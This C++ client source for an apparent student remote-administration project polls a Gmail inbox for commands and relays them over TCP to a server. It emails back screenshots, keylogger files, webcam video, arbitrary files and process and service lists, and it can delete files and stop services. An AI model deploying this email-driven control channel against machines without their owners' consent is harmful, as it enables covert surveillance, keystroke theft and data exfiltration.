#include "client.h"

int main()
{
    //Set up UI
    hideCursor();
    FrameMenu frame;
    double widthOfFrame, heightOfFrame;
    frame.getWidthAndHeight(widthOfFrame, heightOfFrame);
    int widthConsole, heightConsole;
    getConsoleSize(widthConsole, heightConsole);
    //Begin client
    printCentered("Press Enter to begin!", heightConsole / 2);
    cin.ignore();
    system("cls");
    //Set up DLL
    int port = 55555;
    WSADATA wsaData;
    int wsaerr;
    printCentered("========== CLIENT ==========", heightConsole / 2 - 2);
    printCentered("=== Set up DLL ===", heightConsole / 2 + 2);
    WORD wVersionRequested = MAKEWORD(2, 2);
    wsaerr = WSAStartup(wVersionRequested, &wsaData);
    Sleep(2000);
    //Announcement of DLL
    if (wsaerr != 0)
    {
        vector<string> content;
        content.push_back("The Winsock dll not found");
        frame.displayAnimationDefault(content);
        return 0;
    }
    else
    {
        string s1 = "The Winsock dll found!";
        string s2 = "The status: ";
        vector<string> content;
        content.push_back(s1);
        content.push_back(s2 + wsaData.szSystemStatus);
        frame.displayAnimationDefault(content);

    }
    CSMTPClient SMTPClient([](const std::string&){ return; });
    CIMAPClient IMAPClient([](const std::string& strLogMsg) { std::cout << strLogMsg << std::endl;  });
    SMTPClient.InitSession("smtp.gmail.com:465", EMAIL_ACCOUNT, EMAIL_PASSWORD,
                            CMailClient::SettingsFlag::ALL_FLAGS, CMailClient::SslTlsFlag::ENABLE_SSL);
    //Begin requests
    while (1)  
    {
        //Read from mail
        string IPOfServer = "127.0.0.1";

        char messageFromServer[bufferSize] = {};
        char messageFromClient[bufferSize] = {};

        IMAPClient.InitSession("imap.gmail.com:993", EMAIL_ACCOUNT, EMAIL_PASSWORD,
            CMailClient::SettingsFlag::ALL_FLAGS, CMailClient::SslTlsFlag::ENABLE_SSL);

        string strSearch;
        bool bResRcvStr = IMAPClient.Search(strSearch, CIMAPClient::SearchOption::CUSTOMIZED);
        if (!bResRcvStr) {
            // system("cls");
            // frame.printRectangleInCenter();
            // printCenteredInRectangle(widthOfFrame, heightOfFrame, "Search failed", 0);
            vector<string> content;
            content.push_back("Search failed");
            frame.displayAnimationDefault(content);
            break;
        }
        // std::cout << strSearch << " " << strSearch.length() << "\n";
        string mailIndex = IMAPClient.GetMailIndex(strSearch);
        // cout << mailIndex  << " " << mailIndex.length() << " mailindex\n";

        if (mailIndex == "") {
            bool bRes = IMAPClient.CleanupSession();
            frame.displayAnimation1(200, "WAITING FOR NEW MAILS!");
            // Sleep(1000);
            continue;
        }

        string strHeader, strBody;
        bResRcvStr = IMAPClient.GetHeaderString(mailIndex, strHeader);
        bResRcvStr = IMAPClient.GetBodyString(mailIndex, strBody);

        IPOfServer = stripString(IMAPClient.GetContent(strBody, "IP:"));
        if (IPOfServer == "") {
            // cout << "No IP in mail\n";
            vector<string> content;
            content.push_back("No IP in mail\n");
            frame.displayAnimationDefault(content);
            bool bRes = IMAPClient.CleanupSession();
            continue;
        }

        // cout << bResRcvStr << "\n" << strHeader << "\n";
        string strSubject = stripAndLowerString(IMAPClient.GetSubject(strHeader));
        // cout << "Subject get: " << strSubject << "\n";
        string strSender = stripString(IMAPClient.GetSender(strHeader));
        // cout << "Sender get: " << strSender << "\n";

        vector<string> content;
        // content.push_back(strHeader);
        content.push_back("Subject get: " + strSubject);
        content.push_back("Sender get: " + strSender);
        frame.displayAnimationDefault(content);

        //Create socket
        SOCKET clientSocket;
        clientSocket = INVALID_SOCKET;
        clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (clientSocket == INVALID_SOCKET)
        {
            // cout << "Error at socket(): " << WSAGetLastError() << endl;
            vector<string> content;
            content.push_back("Error at socket(): " + WSAGetLastError());
            frame.displayAnimationDefault(content);
            bool bRes = IMAPClient.CleanupSession();
            continue;
            // WSACleanup();
            // return 0;
        }
        else {
            vector<string> content;
            content.push_back("socket() is OK!");
            frame.displayAnimationDefault(content);
        }
        
        //Connect to server
        sockaddr_in clientService;
        clientService.sin_family = AF_INET;
        InetPton(AF_INET, IPOfServer.c_str(), &clientService.sin_addr.s_addr);
        clientService.sin_port = htons(port);
        if (connect(clientSocket, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR)
        {
            // cout << "Client: connect() - Failed to connect." << endl;
            vector<string> content;
            content.push_back("Client: connect() - Failed to connect.");
            frame.displayAnimationDefault(content);
            bool bRes = IMAPClient.CleanupSession();
            continue;
            // WSACleanup();
            // return 0;
        }
        else
        {
            vector<string> content;
            content.push_back("Client: connect() is OK");
            content.push_back("Connect with Server IP: " + IPOfServer);
            content.push_back("Client: Can start sending and receiving data...");
            frame.displayAnimationDefault(content);
        }

        strcpy(messageFromClient, strSubject.c_str());
        messageFromClient[strSubject.length()] = '\0';
        int byteCount = send(clientSocket, messageFromClient, bufferSize, 0);
        if (byteCount > 0) {
            // cout << "Message sent: " << messageFromClient << endl;
            // cout << "Message length: " << strlen(messageFromClient) << endl;
            // cout << "Subject length: " << strSubject.length() << endl;
            vector<string> content;
            content.push_back("Message sent: " + string(messageFromClient));
            // content.push_back("Message length: " + to_string(strlen(messageFromClient)));
            // content.push_back("Subject length: " + to_string(strSubject.length()));
            frame.displayAnimationDefault(content);
        }
        else WSACleanup();
        if (string(messageFromClient) == "syntax")
        {
            string syntax = createSyntaxHtmlTable(ALL);
            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Syntax", syntax, "");
            if (bResSendMail) cout << "Send mail successfully\n";
            else cout << "Send mail failed\n";
            closesocket(clientSocket);
        }
        else if (string(messageFromClient) == "capturescreen")
        {
            // Step 1: Receive the file size
            streamsize fileSize;
            recv(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
            // cout << "Expected file size: " << fileSize << " bytes" << endl;

            // Step 2: Prepare to receive the file in chunks
            ofstream outputFile("./output/received_image.bmp", ios::binary|ios::out);
            if (!outputFile.is_open()) {
                // cout << "Failed to open file for writing" << endl;
                vector<string> content;
                content.push_back("Failed to open file for writing");
                frame.displayAnimationDefault(content);
                break;
            }

            char fileBuffer[bufferSize];
            streamsize totalReceived = 0;

            while (totalReceived < fileSize) {
                int bytesReceived = recv(clientSocket, fileBuffer, bufferSize, 0);
                if (bytesReceived > 0) {
                    outputFile.write(fileBuffer, bytesReceived);
                    totalReceived += bytesReceived;
                    // cout << "Received " << bytesReceived << " bytes (" << totalReceived << "/" << fileSize << ")" << endl;
                }
                else if (bytesReceived == 0) {
                    // cout << "Connection closed by server" << endl;
                    vector<string> content;
                    content.push_back("Connection closed by server");
                    frame.displayAnimationDefault(content);
                    break;
                }
                else {
                    // cout << "Error receiving file data" << endl;
                    vector<string> content;
                    content.push_back("Error receiving file data");
                    frame.displayAnimationDefault(content);
                    break;
                }
            }

            outputFile.close();
            
            // sendMail(strSender, "PROJECT_MMT Capture Screen", "Day la buc anh da duoc chup!", "./output/received_image.bmp");
            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Capture Screen", "Day la buc anh da duoc chup!", "./output/received_image.bmp");
            if (bResSendMail) {
                vector<string> content2;
                content2.push_back("Send mail successfully\n");
                frame.displayAnimationDefault(content2);
            }
            else {
                vector<string> content2;
                content2.push_back("Send mail failed\n");
                frame.displayAnimationDefault(content2);
            }
            closesocket(clientSocket);
        }
        else if (string(messageFromClient) == "listservices")
        {
            // Step 1: Receive the file size from the server
            streamsize fileSize;
            int result = recv(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
            if (result <= 0) {
                // cout << "Error receiving file size or connection closed by server" << endl;
                vector<string> content;
                content.push_back("Error receiving file size or connection closed by server");
                frame.displayAnimationDefault(content);
                continue;
            }
            // cout << "Expected file size: " << fileSize << " bytes" << endl;
            vector<string> content;
            content.push_back("Expected file size: " + to_string(fileSize) + " bytes");
            frame.displayAnimationDefault(content);

            // Step 2: Prepare to receive the file in chunks and save it as services.txt
            ofstream outputFile("./output/received_services.txt", ios::binary|ios::out);
            if (!outputFile.is_open()) {
                // cout << "Failed to open received_services.txt for writing" << endl;
                vector<string> content;
                content.push_back("Failed to open received_services.txt for writing");
                frame.displayAnimationDefault(content);
                continue;
            }

            // Receive the file content in chunks
            char fileBuffer[bufferSize];
            streamsize totalReceived = 0;

            while (totalReceived < fileSize) {
                int bytesReceived = recv(clientSocket, fileBuffer, bufferSize, 0);
                if (bytesReceived > 0) {
                    outputFile.write(fileBuffer, bytesReceived);
                    totalReceived += bytesReceived;
                    // cout << "Received " << bytesReceived << " bytes (" << totalReceived << "/" << fileSize << ")" << endl;
                }
                else if (bytesReceived == 0) {
                    // cout << "Connection closed by server" << endl;
                    vector<string> content;
                    content.push_back("Connection closed by server");
                    frame.displayAnimationDefault(content);
                    break;
                }
                else {
                    // cout << "Error receiving file data: " << WSAGetLastError() << endl;
                    vector<string> content;
                    content.push_back("Error receiving file data: " + WSAGetLastError());
                    frame.displayAnimationDefault(content);
                    break;
                }
            }
            outputFile.close();

            vector<string> headers;
            headers.push_back("STT");
            headers.push_back("Service name");
            headers.push_back("Display name");
            vector<vector<string>> data;
            ifstream inputFile("./output/received_services.txt");
            if (!inputFile.is_open()) {
                cout << "Failed to open received_services.txt for reading" << endl;
                continue;
            }
            string line;
            int cnt = 1;
            while (getline(inputFile, line)) {
                vector<string> row;
                row.push_back(to_string(cnt));
                row.push_back(IMAPClient.GetContent(line, "SERVICE_NAME:"));
                getline(inputFile, line);
                row.push_back(IMAPClient.GetContent(line, "DISPLAY_NAME:"));
                data.push_back(row);
                cnt++;
                getline(inputFile, line);
            }
            inputFile.close();

            string body = "<p>Got services list successfully!</p>" + createHtmlTable(headers, data);

            // sendMail(strSender, "PROJECT_MMT List Service", "Day la danh sach cac dich vu!", "./output/received_services.txt");
            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT List Services", body, "");
            if (bResSendMail) {
                vector<string> content2;
                content2.push_back("Send mail successfully\n");
                frame.displayAnimationDefault(content2);
            }
            else {
                vector<string> content2;
                content2.push_back("Send mail failed\n");
                frame.displayAnimationDefault(content2);
            }
            closesocket(clientSocket);
        }
        else if (string(messageFromClient) == "startservice")
        {
            string serviceToStart = stripString(IMAPClient.GetContent(strBody, "Service name:"));
            // cout << "Name of service to start: ";
            // getline(cin, serviceToStart);
            send(clientSocket, serviceToStart.c_str(), bufferSize, 0);
            byteCount = recv(clientSocket, messageFromServer, bufferSize, 0);

            if (byteCount > 0) {
                // cout << "Message received: " << messageFromServer << endl;
                vector<string> content;
                content.push_back("Message received: " + string(messageFromServer));
                frame.displayAnimationDefault(content);
            }

            // sendMail(strSender, "PROJECT_MMT Start Service", messageFromServer, "");
            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Start Service", messageFromServer, "");
            if (bResSendMail) {
                vector<string> content2;
                content2.push_back("Send mail successfully\n");
                frame.displayAnimationDefault(content2);
            }
            else {
                vector<string> content2;
                content2.push_back("Send mail failed\n");
                frame.displayAnimationDefault(content2);
            }
            closesocket(clientSocket);
        }
        else if (string(messageFromClient) == "stopservice")
        {
            string serviceToStop = stripString(IMAPClient.GetContent(strBody, "Service name:"));;
            send(clientSocket, serviceToStop.c_str(), bufferSize, 0);
            byteCount = recv(clientSocket, messageFromServer, bufferSize, 0);

            if (byteCount > 0) {
                vector<string> content;
                content.push_back("Message received: " + string(messageFromServer));
                frame.displayAnimationDefault(content);
            }

            // sendMail(strSender, "PROJECT_MMT Stop Service", messageFromServer, "");
            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Stop Service", messageFromServer, "");
            if (bResSendMail) {
                vector<string> content2;
                content2.push_back("Send mail successfully\n");
                frame.displayAnimationDefault(content2);
            }
            else {
                vector<string> content2;
                content2.push_back("Send mail failed\n");
                frame.displayAnimationDefault(content2);
            }
            closesocket(clientSocket);
        }
        else if (string(messageFromClient) == "keylogger")
        {
            string time = stripString(IMAPClient.GetContent(strBody, "Time:"));
            if (time == "") {
                cout << "Keylogger time not found! Please try again!" << endl;
                bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "ERROR!", "Keylogger time not found! Please try again!", "");
                if (bResSendMail) cout << "Send mail successfully\n";
                else cout << "Send mail failed\n";
                closesocket(clientSocket);
            }
            send(clientSocket, time.c_str(), bufferSize, 0);
            streamsize fileSize;
            int result = recv(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
            if (result <= 0) {
                // cout << "Error receiving file size or connection closed by server" << endl;
                vector<string> content;
                content.push_back("Error receiving file size or connection closed by server");
                frame.displayAnimationDefault(content);
                continue;
            }
            // cout << "Expected file size: " << fileSize << " bytes" << endl;
            vector<string> content;
            content.push_back("Expected file size: " + to_string(fileSize) + " bytes");
            frame.displayAnimationDefault(content);
            // Step 2: Prepare to receive the file in chunks and save it as services.txt
            ofstream outputFile("./output/keylogger.txt", ios::binary|ios::out);
            if (!outputFile.is_open()) {
                vector<string> content;
                content.push_back("Failed to open keylogger.txt for writing");
                frame.displayAnimationDefault(content);
                // sendMail(strSender, "PROJECT_MMT Keylogger", "Failed to open keylogger.txt for writing!", "");
                bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Keylogger", "Failed to open keylogger.txt for writing!", "");
                if (bResSendMail) {
                    vector<string> content2;
                    content2.push_back("Send mail successfully\n");
                    frame.displayAnimationDefault(content2);
                }
                else {
                    vector<string> content2;
                    content2.push_back("Send mail failed\n");
                    frame.displayAnimationDefault(content2);
                }
                continue;
            }

            // Receive the file content in chunks
            char fileBuffer[bufferSize];
            streamsize totalReceived = 0;

            while (totalReceived < fileSize) {
                int bytesReceived = recv(clientSocket, fileBuffer, bufferSize, 0);
                if (bytesReceived > 0) {
                    outputFile.write(fileBuffer, bytesReceived);
                    totalReceived += bytesReceived;
                    // cout << "Received " << bytesReceived << " bytes (" << totalReceived << "/" << fileSize << ")" << endl;
                }
                else if (bytesReceived == 0) {
                    vector<string> content;
                    content.push_back("Connection closed by server");
                    frame.displayAnimationDefault(content);
                    break;
                }
                else {
                    vector<string> content;
                    content.push_back( "Error receiving file data: " + WSAGetLastError());
                    frame.displayAnimationDefault(content);
                    break;
                }
            }
            outputFile.close();        

            // sendMail(strSender, "PROJECT_MMT Keylogger", "Day la file keylogger da duoc ghi!", "./output/keylogger.txt"); 
            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Keylogger", "Day la file keylogger da duoc ghi!", "./output/keylogger.txt");
            if (bResSendMail) {
                vector<string> content2;
                content2.push_back("Send mail successfully\n");
                frame.displayAnimationDefault(content2);
            }
            else {
                vector<string> content2;
                content2.push_back("Send mail failed\n");
                frame.displayAnimationDefault(content2);
            }
            closesocket(clientSocket);
        }
        else if (string(messageFromClient) == "listapp")
        {
            vector<Application> gotApp;
            byteCount = receiveApplications(clientSocket, gotApp);
            if (byteCount > 0)
            {
                vector<string> content;
                content.push_back("Message received: Got apps list successfully!");
                frame.displayAnimationDefault(content);
            }
            else 
                WSACleanup();
            sort(gotApp.begin(), gotApp.end(), comparePID);
            vector<string> headers;
            headers.push_back("STT"); 
            headers.push_back("Name");
            headers.push_back("Exe file name");
            headers.push_back("PID");
            vector<vector<string>> data;
            int cnt = 1;
            // auto iter = gotApp.begin();
            for (auto x : gotApp){
                vector<string> row;
                row.push_back(to_string(cnt));
                row.push_back(x.title);
                row.push_back(x.fileName);
                row.push_back(to_string(x.pid));
                data.push_back(row);
                cnt++;
            }
            string body = "<p>Got apps list successfully!</p>" + createHtmlTable(headers, data);
            // sendMail(strSender, "PROJECT_MMT List App", body, "");
            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT List App", body, "");
            if (bResSendMail) {
                vector<string> content2;
                content2.push_back("Send mail successfully\n");
                frame.displayAnimationDefault(content2);
            }
            else {
                vector<string> content2;
                content2.push_back("Send mail failed\n");
                frame.displayAnimationDefault(content2);
            }
            closesocket(clientSocket);
        }
        else if (string(messageFromClient).substr(0, 7) == "openapp")
        {
            string nameApp = stripString(IMAPClient.GetContent(strBody, "App name:"));
            send(clientSocket, nameApp.c_str(), bufferSize, 0);
            byteCount = recv(clientSocket, messageFromServer, bufferSize, 0);
            if (byteCount > 0) {
                // cout << "Message received: " << messageFromServer << endl;
                vector<string> content;
                content.push_back("Message received: " + string(messageFromServer));
                frame.displayAnimationDefault(content);
                // sendMail(strSender, "PROJECT_MMT Open App", messageFromServer, "");
                bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Open App", messageFromServer, "");
                if (bResSendMail) {
                    vector<string> content2;
                    content2.push_back("Send mail successfully\n");
                    frame.displayAnimationDefault(content2);
                }
                else {
                    vector<string> content2;
                    content2.push_back("Send mail failed\n");
                    frame.displayAnimationDefault(content2);
            }
            }
            else {
                vector<string> content;
                content.push_back("Receiving message from server failed!");
                frame.displayAnimationDefault(content);
            }
            closesocket(clientSocket);
        }
        else if (string(messageFromClient).substr(0, 8) == "closeapp")
        {
            string appName = stripString(IMAPClient.GetContent(strBody, "App name:"));
            send(clientSocket, appName.c_str(), bufferSize, 0);
            byteCount = recv(clientSocket, messageFromServer, bufferSize, 0);
            if (byteCount > 0) {
                vector<string> content;
                content.push_back("Message received: " + string(messageFromServer));
                frame.displayAnimationDefault(content);
                // sendMail(strSender, "PROJECT_MMT Close App", messageFromServer, "");
                bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Close App", messageFromServer, "");
                if (bResSendMail) {
                    vector<string> content2;
                    content2.push_back("Send mail successfully\n");
                    frame.displayAnimationDefault(content2);
                }
                else {
                    vector<string> content2;
                    content2.push_back("Send mail failed\n");
                    frame.displayAnimationDefault(content2);
            }
            }
            else {
                vector<string> content;
                content.push_back("Receiving message from server failed!");
                frame.displayAnimationDefault(content);
            }
            closesocket(clientSocket);
        }
        else if (string(messageFromClient).substr(0, 10) == "deletefile")
        {
            string filePath = stripString(IMAPClient.GetContent(strBody, "File path:"));
            send(clientSocket, filePath.c_str(), bufferSize, 0);
            byteCount = recv(clientSocket, messageFromServer, bufferSize, 0);
            if (byteCount > 0) {
                vector<string> content;
                content.push_back("Message received: " + string(messageFromServer));
                frame.displayAnimationDefault(content);
                // sendMail(strSender, "PROJECT_MMT Delete File", messageFromServer, "");
                bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Delete File", messageFromServer, "");
                if (bResSendMail) {
                    vector<string> content2;
                    content2.push_back("Send mail successfully\n");
                    frame.displayAnimationDefault(content2);
                }
                else {
                    vector<string> content2;
                    content2.push_back("Send mail failed\n");
                    frame.displayAnimationDefault(content2);
                }
            }
            else {
                vector<string> content;
                content.push_back("Receiving message from server failed!");
                frame.displayAnimationDefault(content);
            }
            closesocket(clientSocket);
        }
        else if (string(messageFromClient).substr(0, 7) == "getfile")
        {
            string filePath, fileName;
            filePath = stripString(IMAPClient.GetContent(strBody, "File path:"));
            fileName = getFileName(filePath);
            string _filePath = escapeBackslashes(filePath);
            send(clientSocket, _filePath.c_str(), _filePath.size(), 0);
            vector<string> content;
            content.push_back("Announcement: ");
            frame.displayAnimationDefault(content);
            receiveFile(clientSocket, fileName);
            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Get File", "Day la file da duoc gui!", "./output/" + fileName);
            if (bResSendMail) {
                vector<string> content2;
                content2.push_back("Send mail successfully\n");
                frame.displayAnimationDefault(content2);
            }
            else {
                vector<string> content2;
                content2.push_back("Send mail failed\n");
                frame.displayAnimationDefault(content2);
            }
            closesocket(clientSocket);
        }
        else if (string(messageFromClient) == "startwebcam")
        {
            // cout << "Recording...!" << endl;
            // cout << "Sending 'stopWebcam' to this IP again to stop!" << endl;
            vector<string> content1;
            content1.push_back("Recording...!");
            content1.push_back("Sending 'stopWebcam' to this IP again to stop!");
            frame.displayAnimationDefault(content1);
            // sendMail(strSender, "PROJECT_MMT Webcam", "Mo webcam thanh cong!", "");
            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Webcam", "Mo webcam thanh cong!", "");
            if (bResSendMail) {
                vector<string> content2;
                content2.push_back("Send mail successfully\n");
                frame.displayAnimationDefault(content2);
            }
            else {
                vector<string> content2;
                content2.push_back("Send mail failed\n");
                frame.displayAnimationDefault(content2);
            }
            closesocket(clientSocket);
        }
        else if (string(messageFromClient) == "stopwebcam")
        {
            // cout << "Stop now!" << endl;
            vector<string> content1;
            content1.push_back("Stop now!");
            frame.displayAnimationDefault(content1);
            receiveFile(clientSocket, "output.mp4");
            // sendMail(strSender, "PROJECT_MMT Webcam", "Day la video da duoc ghi!", "./output/output.mp4");
            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Webcam", "Day la video da duoc ghi!", "./output/output.mp4");
            if (bResSendMail) {
                vector<string> content2;
                content2.push_back("Send mail successfully");
                frame.displayAnimationDefault(content2);
            }
            else {
                vector<string> content2;
                content2.push_back("Send mail failed");
                frame.displayAnimationDefault(content2);
            }
            closesocket(clientSocket);
        }
        bool bRes = IMAPClient.CleanupSession();
        Sleep(1000);
    }

    bool cleanup = SMTPClient.CleanupSession();

    system("pause");
    WSACleanup();
    return 0;
}